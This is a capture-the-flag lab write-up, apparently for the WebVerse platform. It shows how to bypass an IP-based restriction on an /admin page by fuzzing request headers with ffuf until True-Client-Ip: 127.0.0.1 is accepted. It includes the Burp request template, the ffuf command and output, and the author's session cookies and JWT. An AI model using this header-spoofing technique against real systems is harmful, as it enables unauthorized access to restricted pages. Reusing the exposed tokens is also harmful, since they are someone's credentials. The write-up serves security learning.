---
source: WebVerse
title: GuardedJacket
difficulty: easy
tags: Header Manipulation, ffuf
summary: The site states that the network is - *Protected by GuardedJacket Edge. The staff portal is restricted to the on-site network.*. The attacker can inject headers into the request to the **/admin** endpoint, tricking the server into believing the request came from inside of the network.
target: https://dashboard.webverselabs-pro.com/events/guardedjacket
platform: https://webverselabs-pro.com/
---
! GuardedJacket's public site is busy with course catalogs, class schedules and sign-ups, but the academy also keeps an internal staff dashboard that the public was never meant to see. The whole site is live in front of you, find your way into the staff dashboard and read the facility access key it holds. 

## [01] Scraping the Site for Networking Information

Once we get on the landing page, we get quite a few options to poke around at, Courses, Schedules, Instructors, etc.
![Landing page.](./images/landing.png)

Our briefing mentions an internal staff dashboard, so let's look around and see if we can find a way in. Looking at the **Schedule** tab, we get an idea of what the back end might be holding on to. Courses, schedules, reservations. It also mentions to *Get in touch.* for private lessons, which links to the contact endpoint. 
![Scheduling options.](./images/reserve.png)

We can fill out the contact form, probing for **Cross Site Scripting (XSS)** attacks while we are at it.
![Contact form, checking for potential XSS.](./images/contact.png)

We don't get anything back on the first XSS test, and we also get a notice stating our reply would be within one business day. We don't have one business day, so let's keep looking. I didn't find any other way to inject, read or write data at this point. Something stands out near the footer of the page though, there is a note left behind that states the staff portal is restricted to the onsite network.
![Verbose note left behind.](./images/note.png)

This lines up with our briefing, status there was a internal staff dashboard. We can manually try common endpoints such as `/admin` or `/staff` before hammering it with a wordlist. We get a **403** on `/admin`. 
![403 on /admin.](./images/admin.png)

## [02] Injecting Headers to Reach the /admin Endpoint

403 means we are unauthorized to view this endpoint. We also get a familiar warning, stating the endpoint is restricted to the onsite network. My first thought was to try and manipulate the request headers to see if we can get the server to believe the request came from inside the network. I tried a few common headers, such as `X-Forwarded-For: 127.0.0.1` but had no luck. We can use a tool like `ffuf` to run a dictionary attack on the headers, automating the attack. I prefer adding the FUZZ keyword to the request in Burp, saving it to a file, and then using `ffuf` to run the attack.

```http
GET /admin HTTP/2
Host: 87857525-6940-guardedjacket-65d4e.events.webverselabs-pro.com
Cookie: wv_attr=%7B%22s%22%3A%22referral%22%2C%22m%22%3A%22%22%2C%22c%22%3A%22%22%2C%22r%22%3A%22duckduckgo.com%22%2C%22l%22%3A%22%2F%22%7D; cf_clearance=ChmypHttvQFnWa_aFueEBDqZX9IQHYUov-V30g5VQCkr7r2-HewuQKY0yvm9fS6nPaDvp0zIlDBxoLYO83LYiBIgkhNA5fJa_wWPNEn2pvmfW4Ez7oWRY26Xp9sjP7YHwT3rqpou20ctUqwZpZG-BeHzUAAmFZkY65hE_IugV8C7cabVFu3yX1d8Ipueq-WbTIzAIbASr4MzTOp2QoYsiBypHJQkNGi6PtURRHHtZussGqON2T3AMU6CKeyZtNAtGNMPVXk-FuULrcr2RV93PfOf3VfKXJLDtasgunMWVVoaqImDZZfofslK331jtaMn; token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiI2OTQwIiwiZXhwIjoxNzk1MjI0ODgwLCJpYXQiOjE3OTUxMzg0ODB9.PBmE-HtpHGTG5rdrVD1Nueb8iZGNnTBcVEf3o69tVvw; ph_phc_rsTMoYXxbRkxMPwd98RL8uhRZUyc74VUMvDjyqC3uiJn_posthog=%7B%22%24device_id%22%3A%2201a18205-6021-7b32-8e90-e3f4cc571c07%22%2C%22distinct_id%22%3A%226940%22%2C%22%24sesid%22%3A%5B1795138552604%2C%2201a1f697-36c1-75b5-8411-d576e5fa9de4%22%2C1795138467514%5D%2C%22%24epp%22%3Atrue%2C%22%24initial_person_info%22%3A%7B%22r%22%3A%22%24direct%22%2C%22u%22%3A%22https%3A%2F%2Fdashboard.webverselabs-pro.com%2Fdashboard%22%7D%2C%22%24user_state%22%3A%22identified%22%7D; connect.sid=s%3A4WHdn6FpJvRmYf9aqSuIn0aEsQasWoPK.3NJBjqHxftmtGvwtWpS6DdSTRf3tiKdGbPhkns%2Bj2CU
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
FUZZ: 127.0.0.1 //127.0.0.1 points to localhost
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
```

The reason we use `X: 127.0.0.1`, is that 127.0.0.1 is the address for localhost. The idea here is to send a header that the server will read, making the server think the request came from inside the network from localhost. Below is our ffuf syntax and output:
```term
$ ffuf -request admin.req -w /usr/share/wordlists/SecLists-master/Discovery/Web-Content/BurpSuite-ParamMiner/lowercase-headers -fc 403 -c
                                                                                                                                                                                                                                                                                         
        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : https://87857525-6940-guardedjacket-65d4e.events.webverselabs-pro.com/admin
 :: Wordlist         : FUZZ: /usr/share/wordlists/SecLists-master/Discovery/Web-Content/BurpSuite-ParamMiner/lowercase-headers
 :: Header           : Host: 87857525-6940-guardedjacket-65d4e.events.webverselabs-pro.com
 :: Header           : Cookie: wv_attr=%7B%22s%22%3A%22referral%22%2C%22m%22%3A%22%22%2C%22c%22%3A%22%22%2C%22r%22%3A%22duckduckgo.com%22%2C%22l%22%3A%22%2F%22%7D; cf_clearance=ChmypHttvQFnWa_aFueEBDqZX9IQHYUov-V30g5VQCkr7r2-HewuQKY0yvm9fS6nPaDvp0zIlDBxoLYO83LYiBIgkhNA5fJa_wWPNEn2
pvmfW4Ez7oWRY26Xp9sjP7YHwT3rqpou20ctUqwZpZG-BeHzUAAmFZkY65hE_IugV8C7cabVFu3yX1d8Ipueq-WbTIzAIbASr4MzTOp2QoYsiBypHJQkNGi6PtURRHHtZussGqON2T3AMU6CKeyZtNAtGNMPVXk-FuULrcr2RV93PfOf3VfKXJLDtasgunMWVVoaqImDZZfofslK331jtaMn; token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiI2OTQwIiwiZXhwIjoxNzk1MjI0ODgwLCJpYXQiOjE3OTUxMzg0ODB9.PBmE-HtpHGTG5rdrVD1Nueb8iZGNnTBcVEf3o69tVvw; ph_phc_rsTMoYXxbRkxMPwd98RL8uhRZUyc74VUMvDjyqC3uiJn_posthog=%7B%22%24device_id%22%3A%2201a18205-6021-7b32-8e90-e3f4cc571c07%22%2C%22distinct_id%22%3A%226940%22%2C%22%24sesid%22%3A%5B1795138552604%2C%2201a1f697-36c1-75b5-8411-d576e5fa9de4%22%2C1795138467514%5D%2C%22%24epp%22%3Atrue%2C%22%24initial_person_info%22%3A%7B%22r%22%3A%22%24direct%22%2C%22u%22%3A%22https%3A%2F%2Fdashboard.webverselabs-pro.com%2Fdashboard%22%7D%2C%22%24user_state%22%3A%22identified%22%7D; connect.sid=s%3A4WHdn6FpJvRmYf9aqSuIn0aEsQasWoPK.3NJBjqHxftmtGvwtWpS6DdSTRf3tiKdGbPhkns%2Bj2CU
 :: Header           : FUZZ: 127.0.0.1
 :: Header           : Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
 :: Header           : Accept-Language: en-US,en;q=0.5
 :: Header           : Sec-Fetch-Dest: document
 :: Header           : Sec-Fetch-User: ?1
 :: Header           : User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
 :: Header           : Accept-Encoding: gzip, deflate, br
 :: Header           : Upgrade-Insecure-Requests: 1
 :: Header           : Sec-Fetch-Mode: navigate
 :: Header           : Sec-Fetch-Site: none
 :: Header           : Priority: u=0, i
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response status: 403
________________________________________________

!!True-Client-Ip          [Status: 200, Size: 2106, Words: 9, Lines: 8, Duration: 417ms]
:: Progress: [1102/1102] :: Job [1/1] :: 96 req/sec :: Duration: [0:00:11] :: Errors: 2 ::
```

We get a 200 on **True-Client-Ip**. I chose to capture a request to `/admin`, add the `True-Client-Ip: 127.0.0.1` header, and then forward the request. Going back to the browser, we can see the admin page has loaded and we retrieve the flag. I did this from an authenticated account, however, the same results can be achieved from an unauthenticated standpoint.
![Admin access.](./images/flag.png)
